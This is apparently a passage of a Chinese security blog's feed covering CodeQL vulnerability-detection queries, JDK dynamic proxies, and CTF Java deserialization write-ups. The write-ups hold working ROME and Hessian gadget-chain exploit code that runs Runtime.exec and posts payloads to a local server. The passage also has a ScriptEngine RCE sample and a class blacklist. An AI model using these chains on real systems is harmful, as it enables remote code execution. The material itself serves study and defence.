&lt;build&gt;     &lt;sourceDirectory&gt;target/generated-sources/delombok&lt;/sourceDirectory&gt;     &lt;testSourceDirectory&gt;target/generated-test-sources/delombok&lt;/testSourceDirectory&gt;  &lt;plugins&gt;     &lt;plugin&gt;        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;        &lt;artifactId&gt;lombok-maven-plugin&lt;/artifactId&gt;        &lt;version&gt;1.18.20.0&lt;/version&gt;        &lt;executions&gt;           &lt;execution&gt;              &lt;id&gt;delombok&lt;/id&gt;              &lt;phase&gt;generate-sources&lt;/phase&gt;              &lt;goals&gt;                 &lt;goal&gt;delombok&lt;/goal&gt;              &lt;/goals&gt;              &lt;configuration&gt;                 &lt;addOutputDirectory&gt;false&lt;/addOutputDirectory&gt;                 &lt;sourceDirectory&gt;src/main/java&lt;/sourceDirectory&gt;              &lt;/configuration&gt;           &lt;/execution&gt;           &lt;execution&gt;              &lt;id&gt;test-delombok&lt;/id&gt;              &lt;phase&gt;generate-test-sources&lt;/phase&gt;              &lt;goals&gt;                 &lt;goal&gt;testDelombok&lt;/goal&gt;              &lt;/goals&gt;              &lt;configuration&gt;                 &lt;addOutputDirectory&gt;false&lt;/addOutputDirectory&gt;                 &lt;sourceDirectory&gt;src/test/java&lt;/sourceDirectory&gt;              &lt;/configuration&gt;           &lt;/execution&gt;        &lt;/executions&gt;     &lt;/plugin&gt;        &lt;plugin&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;        &lt;/plugin&gt;     &lt;/plugins&gt;    &lt;/build&gt;

解决办法 ②CodeQL官方的issue里面，有人给出了这个问题的解决办法 https://github.com/github/codeql/issues/4984
# get a copy of lombok.jarwget https://projectlombok.org/downloads/lombok.jar -O &quot;lombok.jar&quot;# run &quot;delombok&quot; on the source files and write the generated files to a folder named &quot;delombok&quot;java -jar &quot;lombok.jar&quot; delombok -n --onlyChanged . -d &quot;delombok&quot;# remove &quot;generated by&quot; commentsfind &quot;delombok&quot; -name &#x27;*.java&#x27; -exec sed &#x27;/Generated by delombok/d&#x27; -i &#x27;&#123;&#125;&#x27; &#x27;;&#x27;# remove any left-over import statementsfind &quot;delombok&quot; -name &#x27;*.java&#x27; -exec sed &#x27;/import lombok/d&#x27; -i &#x27;&#123;&#125;&#x27; &#x27;;&#x27;# copy delombok&#x27;d files over the original onescp -r &quot;delombok/.&quot; &quot;./&quot;# remove the &quot;delombok&quot; folderrm -rf &quot;delombok&quot;

没有特别明白这个应该在哪个目录下执行命令。
上面的代码，实现的功能是：去掉代码里的lombok注解，并还原setter和getter方法的java代码，从而使CodeQL的Flow流能够顺利走下去，从而检索到安全漏洞。
持续工程化到此为止，我们编写了SQL注入的查询语句，消除了误报和漏报问题。当前的规则已经能够适应micro-service-seclab项目啦。
因为我们的micro-service-seclab项目，是按照标准生成的微服务结构，那么我们可以使用这个ql规则去跑其他的项目，来自动化检测其它项目，从而做到自动化检测，提高安全检测效率。
CodeQL除了提供VSCode的检测插件，也提供了大量的命令行，来实现项目的集成检测。
比如：
codeql database create ~/CodeQL/databases/micro-service-seclab  --language=&quot;java&quot;  --command=&quot;mvn clean install --file pom.xml -Dmaven.test.skip=true&quot; --source-root=&quot;~/Code/micro-service-seclab/&quot;

我们通过上面语句自动生成codeql的中间数据库(database)。
codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun

我们通过上面的语句可以执行我们写好的QL文件，然后将结果输出到指定csv文件。
利用这两条命令，结合我们自己的程序，我们就能批量的对我们所有的项目做自动化检测了。
CodeQL进阶上面我们完成了对一个简单的SQL注入漏洞的自动化检测工作。
如果你对上面的语法的一些东西还是有些不解，或者想去阅读SDK规则的代码，可以继续往下看，希望我对一些重点语法的总结能够帮到你。
用 instanceof 替代复杂查询语句问题我们在上面的案例当中看到了instanceof, 如果我们去看ql自带的规则库，会发现大量的instanceof语句。

instanceof是用来优化代码结构非常好的语法糖。
我们都知道，我们可以使用exists(|)这种子查询的方式定义source和sink，但是如果source&#x2F;sink特别复杂（比如我们为了规则通用，可能要适配springboot， Thrift RPC，Servlet等source），如果我们把这些都在一个子查询内完成，比如 condition 1 or conditon 2 or condition 3, 这样一直下去，我们可能后面都看不懂了，更别说可维护性了。况且有些情况如果一个子查询无法完成，那么就更没法写了。
instanceof给我们提供了一种机制，我们只需要定义一个abstract class，比如这个案例当中的:
/** A data flow source of remote user input. */abstract class RemoteFlowSource extends DataFlow::Node &#123;  /** Gets a string that describes the type of this remote flow source. */  abstract string getSourceType();&#125;

然后在isSource方法里进行instanceof，判断src是 RemoteFlowSource类型就可以了。
override predicate isSource(DataFlow::Node src) &#123;    src instanceof RemoteFlowSource&#125;

学过java的人可能会很费解，我们继承了一个abstract抽象类，连个实现方法都没有，怎么就能够达到获取各种source的目的呢？
CodeQL和Java不太一样，只要我们的子类继承了这个RemoteFlowSource类，那么所有子类就会被调用，它所代表的source也会被加载。
我们在 RemoteFlowSource定义下面会看到非常多子类，就是这个道理，它们的结果都会被用and串联加载。

递归问题递归调用可以帮助我们解决一类问题：就是我们不确定这个方法我们需要调用多少次才能得到我们的结果，这个时候我们就可以用递归调用。
CodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。我们举一个例子：
在Java语言里，我们可以使用class嵌套class，多个内嵌class的时候，我们需要知道最外层的class是什么怎么办？比如如下代码：
public class StudentService &#123;     class innerOne &#123;        public innerOne()&#123;&#125;         class innerTwo &#123;            public innerTwo()&#123;&#125;             public String Nihao() &#123;                return &quot;Nihao&quot;;            &#125;        &#125;        public String Hi()&#123;            return &quot;hello&quot;;        &#125;    &#125; &#125;

我们想要根据innerTwo类定位到最外层的StudentService类，怎么实现？
按照非递归的写法，我们可以这样做：
import java from Class classeswhere classes.getName().toString() = &quot;innerTwo&quot;select classes.getEnclosingType().getEnclosingType()   // getEnclosingtype获取作用域

我们通过连续2次调用getEnclosingType方法是能够拿到最外层的StudentService的。
但是正如我们所说，实际情况是我们并不清楚一共有多少层嵌套，而且多个文件可能每个的嵌套数量都不一样，我们没法用确定的调用次数来解决此问题，这个时候我们就需要使用递归的方式解决。
我们在调用方法后面加*(从本身开始调用)或者+(从上一级开始调用)，来解决此问题。
from Class classeswhere classes.getName().toString() = &quot;innerTwo&quot;select classes.getEnclosingType+()   // 获取作用域


我们也可以自己封装方法来递归调用
import java RefType demo(Class classes) &#123;    result = classes.getEnclosingType()&#125; from Class classeswhere classes.getName().toString() = &quot;innerTwo&quot;select demo*(classes)   // 获取作用域


强制类型转换问题在CodeQL的规则集里，我们会看到很多类型转换的代码，比如：

这里是对getType()的返回结果做强制类型转换。其实CodeQL当中的强制类型转换，理解成filter更贴切一点，它的意思是将前面的结果符合RefType的数据都留下，不符合的都去掉。
以上class 继承了Parameter，那么getType()目的就是获取项目中所有的参数的type信息。
我们用如下QL语句做个测试：
import java from Parameter paramselect param, param.getType()

以上代码的含义是打印所有方法参数的名称和类型。

我们看到一共有233条结果，并且结果当中含有String，int和其他自定义类型，这是我们没有做任何强制类型转换的结果。然后我们试着执行：
import java from Parameter paramselect param, param.getType().(RefType)

强制转换成RefType，意思就是从前面的结果当中过滤出RefType类型的参数。RefType是什么？引用类型，说白了就是去掉int等基础类型之后的数据。

数据只有181条了。
更直观的测试，我们可以过滤保留所有的数值类型。
import java from Parameter paramselect param, param.getType().(IntegralType)


内存爆炸解决办法如果你现在是 **新版本 CodeQL CLI (&gt;&#x3D;2.9.x)**：

数据库创建时：
export SEMMLE_JAVA_EXTRACTOR_JVM_ARGS=&quot;-Xmx4g&quot;codeql database create db --language=java -s . -M 4000

查询时用：
codeql database analyze db query.ql --ram=4000

如果你还是老版本：

数据库创建时只能用：
codeql database create db --language=java -s . -J=-Xmx4g

FastJson/** * @id java/examples/fastjson * @name Fastjson * @description fastjson * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSourcesmodule FastjsonVulconfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node src) &#123;    src instanceof RemoteFlowSource  &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(Method method, MethodCall call |            method.hasName(&quot;parseObject&quot;)            and            call.getMethod() = method and            sink.asExpr() = call.getArgument(0)        )  &#125;&#125;module fastjsonFlow = TaintTracking::Global&lt;FastjsonVulconfig&gt;;import fastjsonFlow::PathGraphfrom fastjsonFlow::PathNode source, fastjsonFlow::PathNode sinkwhere fastjsonFlow::flowPath(source, sink)select source.getNode(), source, sink, &quot;source&quot;

Rce/** * @id java/examples/rce * @name Rce * @description rce * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSourcesmodule RceVulconfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node src) &#123;    src instanceof RemoteFlowSource  &#125;  predicate isSink(DataFlow::Node sink) &#123;    sink.asExpr() instanceof ArgumentToExec //ArgumentToExec表示传递给命令执行的参数  &#125;&#125;module rceFlow = TaintTracking::Global&lt;RceVulconfig&gt;;import rceFlow::PathGraphfrom rceFlow::PathNode source, rceFlow::PathNode sinkwhere rceFlow::flowPath(source, sink)select source.getNode(), source, sink, &quot;source&quot;

XXE/** * @id java/examples/vuldemo/xxe * @name xxe * @description xxe-vul * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.dataflow.ExternalFlow import DataFlow::PathGraph class XXEVulConfig extends TaintTracking::Configuration &#123;    XXEVulConfig()&#123;        this = &quot;XXEVulConfig&quot;    &#125;    override predicate isSource(DataFlow::Node src) &#123;        src instanceof RemoteFlowSource    &#125;    override predicate isSink(DataFlow::Node sink) &#123;        exists(Method method, MethodAccess call|            method.hasName(&quot;parse&quot;) and            call.getMethod() = method and            sink.asExpr() = call.getArgument(0)            )    &#125; &#125;from XXEVulConfig xxeVulConfig, DataFlow::PathNode source, DataFlow::PathNode sinkwhere xxeVulConfig.hasFlowPath(source, sink)select source.getNode(), source, sink, &quot;source&quot;


下面是其他文章中个人决定有用的点
自写规则模板写脚本熟练之后，就经常用这个来写规则了，开箱即用。
/** * @kind path-problem */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesmodule MyConfiguration implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(MethodCall methodCall |           methodCall.getMethod().getName() = &quot;methodName&quot; and           methodCall.getQualifier().getType().getName() = &quot;ClassName&quot; and           sink.asExpr() = methodCall.getAnArgument()          )  &#125;&#125;module Flow = DataFlow::Global&lt;MyConfiguration&gt;;import Flow::PathGraphfrom Flow::PathNode source, Flow::PathNode sinkwhere Flow::flowPath(source, sink)select sink.getNode(),  source, sink,&quot;xxxInfo RCE&quot;

Shiro 秘钥硬编码查询（支持新版语法）语法已废弃，新版中默认已支持该规则。
shiro在早期版本中的用来序列化反序列化的key可以被定义，查询系统中是否存在默认密钥定义。
import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesimport DataFlow::PathGraph//查询是否存在 Shiro 默认秘钥class ShiroDefaultKey extends TaintTracking::Configuration &#123;    ShiroDefaultKey() &#123; this = &quot;ShiroDefaultKey&quot; &#125;    override predicate isSource(DataFlow::Node src) &#123; src.asExpr() instanceof StringLiteral &#125;    override predicate isSink(DataFlow::Node src) &#123;        exists(MethodCall methodCall |               methodCall.getMethod().getName() = &quot;setCipherKey&quot; and        methodCall.getQualifier().getType().getName() = &quot;CookieRememberMeManager&quot; and        src.asExpr() = methodCall.getAnArgument()        )    &#125;&#125;from DataFlow::PathNode source, DataFlow::PathNode sink, ShiroDefaultKey conf, MethodCall methodCallwhere conf.hasFlowPath(source, sink) and sink.getNode().asExpr() = methodCall.getAnArgument()// select source, sink, methodCall, methodCall.getEnclosingCallable()select source.toString(),source.getNode().getEnclosingCallable(),source.getNode().getEnclosingCallable().getFile().getAbsolutePath(), sink.toString(),sink.getNode().getEnclosingCallable(), sink.getNode().getEnclosingCallable().getFile().getAbsolutePath(), &quot;Shiro Default Key&quot;

脚本更新为新版支持语法，减少waring报错。
/** * @name Apache Shiro Default Key * @description Apache Shiro Default Key * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id java/rce-shiro-default-key * @tags devrules */import javaimport Flow::PathGraphimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesimport semmle.code.java.dataflow.TaintTrackingmodule RCEConfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node source) &#123; source = source &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(MethodCall methodCall, Class c |      methodCall.getMethod().getName() = &quot;setCipherKey&quot; and      methodCall.getQualifier().getType() = c and      c.hasQualifiedName(&quot;org.apache.shiro.web.mgt&quot;, &quot;CookieRememberMeManager&quot;) and      sink.asExpr() = methodCall.getAnArgument()    )  &#125;&#125;module Flow = DataFlow::Global&lt;RCEConfig&gt;;from Flow::PathNode source, Flow::PathNode sinkwhere Flow::flowPath(source, sink)select sink.getNode(), source, sink, &quot;Shiro Default Key&quot;

ScriptEngine RCE规则查询（支持新版语法）Java默认的JavaScript解析器，可以解析Java代码造成任意代码执行。
漏洞代码：
ScriptEngineManager scriptEngineManager = new ScriptEngineManager();ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(&quot;js&quot;);String command = &quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()&quot;;scriptEngine.eval(command);

使用新版规则进行查询，减少控制台Warning警告。
/** * @name Script Engine RCE * @description Script Engine RCE * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id java/rce-script-engine * @tags devrules */import javaimport ScriptEngineFlow::PathGraphimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesmodule ScriptEngineConfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(MethodCall methodCall, Class c |      methodCall.getMethod().getName() = &quot;eval&quot; and      methodCall.getQualifier().getType().getName() = &quot;ScriptEngine&quot; and      sink.asExpr() = methodCall.getAnArgument()    )  &#125;&#125;module ScriptEngineFlow = DataFlow::Global&lt;ScriptEngineConfig&gt;;from ScriptEngineFlow::PathNode source, ScriptEngineFlow::PathNode sinkwhere ScriptEngineFlow::flowPath(source, sink)select sink.getNode(), source, sink, &quot;Script Engine RCE&quot;

Apache Commons Text 远程代码执行漏洞（支持新版语法）/** * @name Apache Commons Text Rce * @description Apache Commons Text Rce * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id java/rce-apache-commons-text * @tags devrules */import javaimport CommonsTextRCEFlow::PathGraphimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesimport semmle.code.java.dataflow.TaintTrackingmodule CommonsTextRCEConfig implements DataFlow::ConfigSig &#123;  predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;  predicate isSink(DataFlow::Node sink) &#123;    exists(MethodCall methodCall , Class c|           methodCall.getMethod().getName().substring(0, 7) = &quot;replace&quot; and           methodCall.getQualifier().getType() = c and           c.hasQualifiedName(&quot;org.apache.commons.text&quot;, &quot;StringSubstitutor&quot;) and           sink.asExpr() = methodCall.getAnArgument()          )  &#125;&#125;module CommonsTextRCEFlow = DataFlow::Global&lt;CommonsTextRCEConfig&gt;;from CommonsTextRCEFlow::PathNode source, CommonsTextRCEFlow::PathNode sinkwhere CommonsTextRCEFlow::flowPath(source, sink)select sink.getNode(), source, sink, &quot;Apache Commons Text Rce&quot;

SpEL表达式注入漏洞（支持新版语法）import java import semmle.code.java.dataflow.DataFlow import semmle.code.java.dataflow.FlowSources module SpELConfig implements DataFlow::ConfigSig &#123;   predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;   predicate isSink(DataFlow::Node sink) &#123;     exists(MethodCall methodCall |       methodCall.getMethod().getName() = &quot;parseExpression&quot; and       methodCall.getQualifier().getType().getName() = &quot;SpelExpressionParser&quot; and       sink.asExpr() = methodCall.getAnArgument()     )   &#125; &#125; module SpELFlow = DataFlow::Global&lt;SpELConfig&gt;; from DataFlow::Node source, DataFlow::Node sink where SpELFlow::flow(source, sink) select source,sink

小技巧有时候获取到的可能并非源码，而是jar包，但是jar包反编译后的源码再次重编译会因为种种原因编译错误，在一次和一位高手沟通的过程中我了解到也可以不通过编译来构建codeql数据库
模拟大部分情况下获取jar包的情况，先打包后反编译
java -jar java-decompiler.jar D:\Downloads\micro_service_seclab\target\micro-service-seclab-0.0.1-SNAPSHOT.jar D:\Downloads\micro_service_seclab\decompile

反编译后得到一个jar包，不过解压后会发现里面的文件不再是class而是java

创建数据库
codeql database create D:\Downloads\micro_service_seclab\database --language java -s D:\Downloads\micro_service_seclab\decompile\micro-service-seclab-0.0.1-SNAPSHOT --overwrite --build-mode none


先记一下，还没试过
像你说的 Hessian 反序列化漏洞 这类场景，漏洞点往往存在于 业务代码调用外部依赖库（Hessian 框架） 的过程中，所以数据库必须包含：

项目自身的源码
项目依赖的三方库（jar 包）

否则 CodeQL 的数据流图不完整，就没法追踪到 HessianInput.readObject() 之类的危险调用。

正确的数据库创建流程（Java 项目）1. 用构建工具生成数据库
Maven 项目：
codeql database create mydb \  --language=java \  --command=&quot;mvn clean compile -DskipTests&quot;

Gradle 项目：
codeql database create mydb \  --language=java \  --command=&quot;./gradlew build -x test&quot;

原理： CodeQL 的 Java extractor 会拦截 javac，在编译过程中把源码和依赖关系收集到数据库里。 这样不仅有项目源码，还会自动把 依赖 jar 包里的类签名 收录进来（用于调用关系）。

2. 如果项目没有标准构建命令有些项目是手工编译或者没用 Maven&#x2F;Gradle。 这时你需要显式告诉 CodeQL 源码 + classpath：
codeql database create mydb \  --language=java \  --source-root . \  --command=&quot;javac -cp &#x27;lib/*&#x27; -d build/classes $(find src -name &#x27;*.java&#x27;)&quot;


lib/*：依赖 jar 包目录（例如包含 hessian.jar）
src：源码目录

这样 extractor 在分析时就能看见 Hessian 的 API 并构建调用图。

3. 确认数据库里包含依赖创建完成后，你可以检查数据库里是否包含依赖：
codeql database interpret-results mydb

或者在 .db 目录下找到 dbscheme，确认是否解析了 Hessian 的类。
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>JDK动态代理</title>
    <url>/2024/11/06/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[静态代理首先定义一个接口，实现类，以及一个代理类
package com.sherlock;public interface IUser &#123;    void show();&#125;

package com.sherlock;public class UserImpl implements IUser&#123;    public UserImpl()&#123;    &#125;    @Override    public void show() &#123;        System.out.println(&quot;展示&quot;);    &#125;&#125;

package com.sherlock;public class UserProxy implements IUser &#123;    IUser user;    public  UserProxy()&#123;&#125;    public UserProxy(IUser user) &#123;this.user = user;&#125;    @Override    public void show() &#123;        user.show();        System.out.println(&quot;调用了show&quot;);    &#125;&#125;

下面我们就来测试一下
package com.sherlock;public class ProxyTest &#123;    public static void main(String[] args) &#123;        IUser user = new UserImpl();        //静态代理        IUser userProxy = new UserProxy(user);        userProxy.show();    &#125;&#125;

静态代理其实就相当于起到了日志记录的功能，比如上述例子中打印调用了show这句话不可能在实现类中出现，只能够在代理类中输出
但是静态代理有一个劣势，就是接口有时候所需要的实现方法不止一个，然后即使是进行重复性的方法代理（如同样加入一个记录日志的功能），也需要在代理类中把方法一个一个都实现了，过于繁琐，那么要怎么解决呢
JDK底层为我们提供了一个解决方案，那就是动态代理
动态代理一个重要的方法，用于代理一个对象：
Proxy.newProxyInstance

我们跟进方法，参数需要一个类加载器对象，一个接口数组对象以及一个InvocationHandler对象；返回的是Object对象

对于InvocationHandler对象，重写一下该invoke方法，此处的invoke()方法就是在于解决静态代理中需要重复重写方法的缺陷，动态代理的好处就是能获取到外部调用的那个方法，然后通过反射来到内部来执行被代理对象的方法
package com.sherlock;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserInvocationHandler implements InvocationHandler &#123;    IUser user;    public UserInvocationHandler()&#123;&#125;;    public UserInvocationHandler(IUser user) &#123;        this.user = user;    &#125;    //invoke方法怎么获取到的method我们不需要了解    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        //打印所调用的方法名        System.out.println(&quot;调用了&quot;+method.getName());        //user为我们所代理的对象        method.invoke(user, args);        return null;    &#125;&#125;

InvocationHandler中的invoke方法当外面有调用方法的时候都会自动执行
然后我们简单测试一下
package com.sherlock;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;public class ProxyTest &#123;    public static void main(String[] args) &#123;        IUser user = new UserImpl();        //动态代理        InvocationHandler userinvocationhandler = new UserInvocationHandler(user);        //代理了user对象，userProxy可以反射调用user对象的所有方法        IUser userProxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationhandler);        userProxy.update();    &#125;&#125;

其实newProxyInstance的第二个参数是获取到一个接口数组，所以我们也可以写成下面这种方式
IUser userProxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),                new Class[]&#123;IUser.class&#125;,                userinvocationhandler);



]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>CTF-java专题</title>
    <url>/2025/07/20/CTF-java%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[2022-长城杯-b4bycoffee首先看该题的依赖，发现rome版本为1.7，存在反序列化漏洞
注意到com.example.bab4coffee.tools目录下面自己写了一个InputSteam
public class AntObjectInputStream extends ObjectInputStream &#123;    private List&lt;String&gt; list = new ArrayList();    public AntObjectInputStream(InputStream inputStream) throws IOException &#123;        super(inputStream);        this.list.add(BadAttributeValueExpException.class.getName());        this.list.add(ObjectBean.class.getName());        this.list.add(ToStringBean.class.getName());        this.list.add(TemplatesImpl.class.getName());        this.list.add(Runtime.class.getName());    &#125;    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;        if (this.list.contains(desc.getName())) &#123;            throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, desc.getName());        &#125; else &#123;            return super.resolveClass(desc);        &#125;    &#125;&#125;

重写了resolveClass并且定义了一个黑名单，但熟悉rome反序列化漏洞的朋友都知道还有一个类没被禁掉，那就是EqualsBean，但是后面的TOStringBean给禁掉了
很幸运，在翻文件的时候看到了CoffeeBean，该类中有一个toString()方法，并且可以加载字节码，允许任意类初始化
这就相当于一个类直接替代掉了之前链子中的ToStringBean和TemplatesImpl
所以我们可以得到以下的这条链子
java.util.HashMap#readObjectjava.util.HashMap#hashcom.rometools.rome.feed.impl.EqualsBean#hashCodecom.rometools.rome.feed.impl.EqualsBean#beanHashCodecom.example.b4bycoffee.model.CoffeeBean#toString

poc这里就不给了，比较简单
import com.example.b4bycoffee.model.CoffeeBean;import com.example.b4bycoffee.tools.AntObjectInputStream;import com.rometools.rome.feed.impl.EqualsBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.InputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Hashtable;public class exploit &#123;    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception&#123;        Field field = obj.getClass().getDeclaredField(fieldname);        field.setAccessible(true);        field.set(obj,value);    &#125;    public static void main(String[] args) throws Exception&#123;        CoffeeBean toStringBean = new CoffeeBean();        Class c = toStringBean.getClass();        Field classByteField = c.getDeclaredField(&quot;ClassByte&quot;);        classByteField.setAccessible(true);        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class));        classByteField.set(toStringBean,bytes);        EqualsBean bean = new EqualsBean(String.class,&quot;a&quot;);        HashMap map1 = new HashMap();        HashMap map2 = new HashMap();        map1.put(&quot;yy&quot;,bean);        map1.put(&quot;zZ&quot;,toStringBean);        map2.put(&quot;zZ&quot;,bean);        map2.put(&quot;yy&quot;,toStringBean);        Hashtable table = new Hashtable();        table.put(map1,&quot;1&quot;);        table.put(map2,&quot;2&quot;);        setFieldValue(bean,&quot;beanClass&quot;,CoffeeBean.class);        setFieldValue(bean,&quot;obj&quot;,toStringBean);        //序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(table);        oos.close();        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));//        InputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(new String(Base64.getEncoder().encode(baos.toByteArray()))));//        AntObjectInputStream antInputStream = new AntObjectInputStream(inputStream);//        antInputStream.readObject();    &#125;&#125;

加载Spring回显类即可，注意这里传参方式是@RequestBody CoffeeRequest coffee，需要使用json传
Hessian_only_jdk该题考的就是hessian_jdk原生链，也没看到什么黑名单啥的，主要的代码就是下面的这个index
package com.ctf.hessian.onlyJdk;import com.caucho.hessian.io.Hessian2Input;import com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.InetSocketAddress;import java.util.concurrent.Executors;public class Index &#123;    public Index() &#123;    &#125;    public static void main(String[] args) throws Exception &#123;        System.out.println(&quot;server start&quot;);        HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0);        server.createContext(&quot;/&quot;, new MyHandler());        server.setExecutor(Executors.newCachedThreadPool());        server.start();    &#125;    static class MyHandler implements HttpHandler &#123;        MyHandler() &#123;        &#125;        public void handle(HttpExchange t) throws IOException &#123;            String response = &quot;Welcome to 0CTF 2022!&quot;;            InputStream is = t.getRequestBody();            try &#123;                Hessian2Input input = new Hessian2Input(is);                input.readObject();            &#125; catch (Exception var5) &#123;                Exception e = var5;                e.printStackTrace();                response = &quot;oops! something is wrong&quot;;            &#125;            t.sendResponseHeaders(200, (long)response.length());            OutputStream os = t.getResponseBody();            os.write(response.getBytes());            os.close();        &#125;    &#125;&#125;

就是对接收到的请求体进行一个hessian反序列化的操作
然后我们看配置文件中的hessian版本为4.0.38，低于4.0.60，所以我们可以直接用上Runtime的那个exp来解决题目
需要注意的是该题的请求体直接传不进去，所以我们需要自己写个代码构造请求传进去
poc如下：
import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.reflect.ReflectionFactory;import sun.reflect.misc.MethodUtil;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.OutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.HttpURLConnection;import java.net.URL;import java.util.Base64;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);        Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);//        MethodUtil.invoke(invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;);        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;&#125;);        defaults.put(&quot;666&quot;,swingLazyValue);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);//        System.out.println(mimeTypeParameterList);        String s = ser(mimeTypeParameterList);//        System.out.println(Base64.getDecoder().decode(s));//        unser(s);        byte[] bytes = Base64.getDecoder().decode(s);        // 发送请求        URL url = new URL(&quot;http://127.0.0.1:8090/&quot;);        HttpURLConnection conn = (HttpURLConnection) url.openConnection();        conn.setDoOutput(true);        conn.setRequestMethod(&quot;POST&quot;);        OutputStream os = conn.getOutputStream();        os.write(bytes);        os.flush();        os.close();        System.out.println(&quot;Response code: &quot; + conn.getResponseCode());    &#125;    public static Object unser(String string) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);        Object obj = hessian2Input.readObject();        return obj;    &#125;    public static String ser(Object object) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);        byteArrayOutputStream.write(67);        hessian2Output.writeObject(object);        hessian2Output.flushBuffer();        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static &lt;T&gt; T createObjWithoutConstructor(Class&lt;T&gt; clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = 